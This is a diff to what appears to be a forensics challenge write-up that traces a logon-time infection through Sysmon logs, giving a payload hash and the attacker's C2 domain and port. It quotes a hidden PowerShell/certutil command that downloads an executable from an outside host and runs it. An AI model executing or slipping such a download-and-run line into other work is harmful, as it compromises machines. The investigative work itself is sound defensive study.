@@ -314,4 +314,23 @@ Format: Remove the double quotes from the log.
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
 ```
 For this i opened the sysmon view and went to the hirarchy tab.As we should know that winlog.exe start userinit.exe for starting process and service that user or computer needs at startup.So we can look  the at tree and see which services started at logon.
-![image15](images/image16.png)
+![image16](images/image16.png)
+As we know that certutil(used to download files from internet) isnit a service that might be running at startup by the windows so i opend and checked the its parent command line
+![image18](images/pic18.png)
+Q3:Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
+```bash
+CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+```
+I went to timeline explorer and search for first.exe as this is file that was download on logon.so on seeing logs we can see the hashes.
+![image18](images/pic19.png)
+![image18](images/pic20.png)
+The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
+Format: domain:port
+```bash
+resolvecyber.xyz:80
+```
+In these same log if we see for Event Id 22 we can actually see the domain name.
+![image18](images/pic20.png)
+![image18](images/pic21.png)
+For port in same logs we go down and can see event id with 3 and open that log we will se all the details about that network connection.
+[image18](images/pci23.png)
